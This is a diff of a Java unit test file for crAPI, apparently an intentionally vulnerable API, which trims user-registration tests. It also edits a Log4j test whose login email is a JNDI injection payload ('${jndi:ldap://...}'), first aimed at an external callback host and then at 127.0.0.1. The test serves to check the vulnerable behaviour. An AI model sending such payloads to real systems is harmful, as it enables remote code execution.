@@ -23,7 +23,6 @@ import com.crapi.entity.ChangeEmailRequest;
 import com.crapi.entity.ProfileVideo;
 import com.crapi.entity.User;
 import com.crapi.entity.UserDetails;
-import com.crapi.entity.VehicleDetails;
 import com.crapi.enums.ERole;
 import com.crapi.exception.EntityNotFoundException;
 import com.crapi.model.CRAPIResponse;
@@ -145,8 +144,7 @@ public class UserServiceImplTest {
 
   @Test
   public void testAuthenticateUserLoginLog4J() throws UnsupportedEncodingException {
-    LoginForm loginForm =
-        getDummyLoginFormByEmail("${jndi:ldap://cb9qcap29r.dev.collab.traceable.ai/a}");
+    LoginForm loginForm = getDummyLoginFormByEmail("${jndi:ldap://127.0.0.1/a}");
     String sampleJwtToken = "sampleToken";
     User user = getDummyUser();
     when(userService.isLog4jEnabled()).thenReturn(true);
@@ -157,7 +155,6 @@ public class UserServiceImplTest {
     Mockito.when(jwtProvider.generateJwtToken(Mockito.any())).thenReturn(sampleJwtToken);
     Mockito.when(userRepository.findByEmail(Mockito.anyString())).thenReturn(getDummyUser());
     Mockito.when(userRepository.saveAndFlush(Mockito.any())).thenReturn(user);
-    // assertTrue(logsList.get(0).getMessage().contains("Log4j Exploit Successful"));
     Assertions.assertEquals(
         userService.authenticateUserLogin(loginForm).getToken(), sampleJwtToken);
     Mockito.verify(userRepository, Mockito.times(1)).saveAndFlush(Mockito.any());
@@ -200,61 +197,6 @@ public class UserServiceImplTest {
     Assertions.assertEquals(user.getJwtToken(), sampleJwt);
     Mockito.verify(userRepository, Mockito.times(1)).saveAndFlush(Mockito.any());
     Mockito.verify(userRepository, Mockito.times(1)).findByEmail(user.getEmail());
-  }
-
-  @Test
-  public void registerUserReturnsNumberAlreadyExists() {
-    SignUpForm signUpForm = getDummySignUpForm();
-    String expectedMessage = UserMessage.NUMBER_ALREADY_REGISTERED + signUpForm.getNumber();
-    Mockito.when(userRepository.existsByNumber(signUpForm.getNumber())).thenReturn(true);
-    Assertions.assertEquals(userService.registerUser(signUpForm).getMessage(), expectedMessage);
-    Mockito.verify(userRepository, Mockito.times(1)).existsByNumber(Mockito.any());
-    Mockito.verify(userRepository, Mockito.times(0)).existsByEmail(Mockito.any());
-  }
-
-  @Test
-  public void registerUserReturnsEmailAlreadyExists() {
-    SignUpForm signUpForm = getDummySignUpForm();
-    String expectedMessage = UserMessage.EMAIL_ALREADY_REGISTERED + signUpForm.getEmail();
-    Mockito.when(userRepository.existsByNumber(signUpForm.getNumber())).thenReturn(false);
-    Mockito.when(userRepository.existsByEmail(signUpForm.getEmail())).thenReturn(true);
-    Assertions.assertEquals(userService.registerUser(signUpForm).getMessage(), expectedMessage);
-    Mockito.verify(userRepository, Mockito.times(1)).existsByNumber(Mockito.any());
-    Mockito.verify(userRepository, Mockito.times(1)).existsByEmail(Mockito.any());
-  }
-
-  @Test(expected = EntityNotFoundException.class)
-  public void registerUserFailsNotAbleToCreateVehicleDetails() {
-    SignUpForm signUpForm = getDummySignUpForm();
-    User user = getDummyUser();
-    Mockito.when(userRepository.existsByNumber(signUpForm.getNumber())).thenReturn(false);
-    Mockito.when(userRepository.existsByEmail(signUpForm.getEmail())).thenReturn(false);
-    Mockito.when(encoder.encode(Mockito.anyString())).thenReturn("EncodedString");
-    Mockito.when(userRepository.save(Mockito.any(User.class))).thenReturn(user);
-    Mockito.when(userDetailsRepository.save(Mockito.any(UserDetails.class)))
-        .thenReturn(getDummyUserDetails());
-    Mockito.when(vehicleService.createVehicle()).thenReturn(null);
-    userService.registerUser(signUpForm);
-  }
-
-  @Test
-  public void registerUserSuccessFull() {
-    SignUpForm signUpForm = getDummySignUpForm();
-    User user = getDummyUser();
-    Mockito.when(userRepository.existsByNumber(signUpForm.getNumber())).thenReturn(false);
-    Mockito.when(userRepository.existsByEmail(signUpForm.getEmail())).thenReturn(false);
-    Mockito.when(encoder.encode(Mockito.anyString())).thenReturn("EncodedString");
-    Mockito.when(userRepository.save(Mockito.any(User.class))).thenReturn(user);
-    Mockito.when(userDetailsRepository.save(Mockito.any(UserDetails.class)))
-        .thenReturn(getDummyUserDetails());
-    Mockito.when(vehicleService.createVehicle()).thenReturn(new VehicleDetails());
-    Mockito.doNothing()
-        .when(smtpMailServer)
-        .sendMail(Mockito.anyString(), Mockito.anyString(), Mockito.anyString());
-    Assertions.assertEquals(
-        userService.registerUser(signUpForm).getStatus(), HttpStatus.OK.value());
-    Mockito.verify(smtpMailServer, Mockito.times(1))
-        .sendMail(Mockito.anyString(), Mockito.anyString(), Mockito.anyString());
   }
 
   @Test
